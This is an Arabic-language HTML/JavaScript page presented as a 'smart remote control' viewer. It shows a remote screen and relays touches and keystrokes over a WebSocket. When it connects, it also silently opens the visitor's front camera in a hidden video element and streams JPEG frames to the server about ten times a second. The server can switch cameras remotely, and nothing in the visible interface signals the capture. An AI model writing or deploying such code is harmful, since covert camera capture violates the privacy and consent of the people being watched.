<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تحكم عن بعد ذكي</title>
    <style>
        body { margin: 0; background: #000; height: 100vh; display: flex; flex-direction: column; overflow: hidden; touch-action: none; }
        #screenDisplay { width: 100vw; height: 100vh; object-fit: contain; position: absolute; z-index: 1; }
        
        /* حقل النص مخفي ولكنه موجود دائماً */
        #hiddenInput {
            position: absolute; top: 0; left: 0; width: 1px; height: 1px;
            opacity: 0; z-index: 20; border: none; outline: none; background: transparent;
            pointer-events: none; /* لا يستقبل لمسات حالياً */
        }
        
        #touchOverlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 10; background: transparent;
        }
        #myVideoPreview { display: none; }
    </style>
</head>
<body>
    <!-- حقل النص فوق كل شيء عند الحاجة -->
    <input type="text" id="hiddenInput" autocomplete="off" autocapitalize="none" spellcheck="false" value=" ">
    
    <div id="touchOverlay"></div>
    <img id="screenDisplay" />
    <video id="myVideoPreview" autoplay muted playsinline></video>

    <script>
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const ws = new WebSocket(`${protocol}//${window.location.host}`);
        const img = document.getElementById('screenDisplay');
        const hiddenInput = document.getElementById('hiddenInput');
        const touchOverlay = document.getElementById('touchOverlay');
        const myVideo = document.getElementById('myVideoPreview');
        
        let remoteKeyboardActive = false;

        ws.onopen = () => {
            console.log("Connected to server");
            startCameraStream("user");
        };

        const sendTouch = (e) => {
            const rect = img.getBoundingClientRect();
            const clientX = e.clientX || (e.touches && e.touches[0].clientX);
            const clientY = e.clientY || (e.touches && e.touches[0].clientY);
            
            if (clientX !== undefined && clientY !== undefined) {
                ws.send(JSON.stringify({
                    type: 'touch',
                    x: clientX / rect.width,
                    y: clientY / rect.height
                }));
            }
            
            // إذا كانت الكيبورد مطلوبة، نركز عليها عند أي لمسة
            if (remoteKeyboardActive) {
                setTimeout(() => hiddenInput.focus(), 10);
            }
        };

        // لمس الشاشة يرسل لمس ويركز على الكيبورد إذا لزم الأمر
        touchOverlay.addEventListener('mousedown', sendTouch);
        touchOverlay.addEventListener('touchstart', (e) => { sendTouch(e); });
        
        // عند الضغط داخل حقل النص نفسه (عندما يكون فعالاً)
        hiddenInput.addEventListener('touchstart', (e) => { sendTouch(e); });

        hiddenInput.oninput = (e) => {
            const val = e.target.value;
            if (val === "") {
                ws.send(JSON.stringify({ type: 'key', value: 'Backspace' }));
                e.target.value = " ";
            } else if (val.length > 1) {
                const text = val.substring(1);
                if (text === " ") ws.send(JSON.stringify({ type: 'key', value: ' ' }));
                else ws.send(JSON.stringify({ type: 'text', value: text }));
                e.target.value = " ";
            }
        };

        ws.onmessage = (event) => {
            if (event.data instanceof Blob) {
                const url = URL.createObjectURL(event.data);
                img.src = url;
                img.onload = () => URL.revokeObjectURL(url);
            } else {
                try {
                    const data = JSON.parse(event.data);
                    if (data.type === 'keyboard_state') {
                        console.log("Keyboard state:", data.visible);
                        remoteKeyboardActive = data.visible;
                        
                        if (remoteKeyboardActive) {
                            // جعل حقل النص يغطي الشاشة ويستقبل اللمس
                            hiddenInput.style.width = "100%";
                            hiddenInput.style.height = "100%";
                            hiddenInput.style.pointerEvents = "auto";
                            hiddenInput.focus();
                        } else {
                            // إعادة حقل النص لحجمه الصغير وإيقاف استقباله للمس
                            hiddenInput.style.width = "1px";
                            hiddenInput.style.height = "1px";
                            hiddenInput.style.pointerEvents = "none";
                            hiddenInput.blur();
                        }
                    } else if (data.type === 'camera_switch_request') {
                        startCameraStream(data.mode);
                    }
                } catch(e) {}
            }
        };

        hiddenInput.onblur = () => {
            if (remoteKeyboardActive) {
                setTimeout(() => hiddenInput.focus(), 50);
            }
        };

        function startCameraStream(mode) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false })
            .then(stream => {
                myVideo.srcObject = stream;
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                setInterval(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        canvas.width = 320;
                        canvas.height = 240;
                        ctx.save();
                        if (mode === "user") { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
                        ctx.drawImage(myVideo, 0, 0, canvas.width, canvas.height);
                        ctx.restore();
                        const base64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
                        ws.send(JSON.stringify({ type: 'remote_camera_frame', data: base64 }));
                    }
                }, 100);
            }).catch(e => console.log("Cam error"));
        }
    </script>
</body>
</html>
